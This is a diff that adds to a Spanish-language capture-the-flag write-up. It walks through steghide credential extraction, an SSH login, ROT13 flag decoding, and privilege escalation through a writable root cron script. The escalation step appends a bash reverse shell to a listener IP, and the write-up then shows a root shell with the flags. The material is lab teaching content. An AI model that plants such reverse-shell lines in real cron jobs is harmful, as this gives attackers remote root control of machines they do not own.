@@ -93,4 +93,60 @@ Accedamos a ese directorio y veremos que en el fuente hay un string encoded pero
 
 Usando la web de md5hashing para hacer hash lookup obtenemos que la password hasheada es mypasswordforthatjob
 
+Podemos usar esta pass para extraer unas creds de la imagen usando steghide
+```
+username:boring
+password:
+01101001 01100011 01101111 01101110 01110110 01100101 01110010 01110100 01100101 01100100 01101101 01111001 01110000 01100001 01110011 01110011 01110111 01101111 01110010 01100100 01110100 01101111 01100010 01101001 01101110 01100001 01110010 01111001
+```
+Veamos en que decodifica el binario
+
+```
+iconvertedmypasswordtobinary
+```
+Finalmente las creds son 
+```
+boring:iconvertedmypasswordtobinary
+```
+
+Veamos si valen para el SSH
+
+```
+me@me:~$ ssh boring@10.10.176.97 -p 6498
+boring@kral4-PC:~$ ls
+user.txt
+boring@kral4-PC:~$ cat user.txt 
+User Flag But It Seems Wrong Like It`s Rotated Or Something
+synt{a0jvgf33zfa0ez4y}
+```
+
+Aplicamos ROT13 a el texto y nos sale una flag
+```
+flag{n0wits33msn0rm4l}
+```
+
+## Privesc
+
+Viendo el crontab tenemos la siguiente linea
+```
+* *    * * *   root    cd /var/www/ && sudo bash .mysecretcronjob.sh
+```
+Veamos si podemos editar de algun modo ese archivo
+```
+-rwxr-xr-x  1 boring boring   33 Jun 14 22:43 .mysecretcronjob.sh
+```
+Parece que si, veamos si puedo invocar una reverse shell hacia mi máquina 
+
+```
+echo 'bash -i >& /dev/tcp/10.9.95.54/4444 0>&1' >> /var/www/.mysecretcronjob.sh
+```
+
+Y obtenemos una shell en nuestra máquina
+```
+root@kral4-PC:~# id
+uid=0(root) gid=0(root) groups=0(root)
+root@kral4-PC:~# cat .root.txt
+cat .root.txt
+flag{63a9f0ea7bb98050796b649e85481845}
+```
 
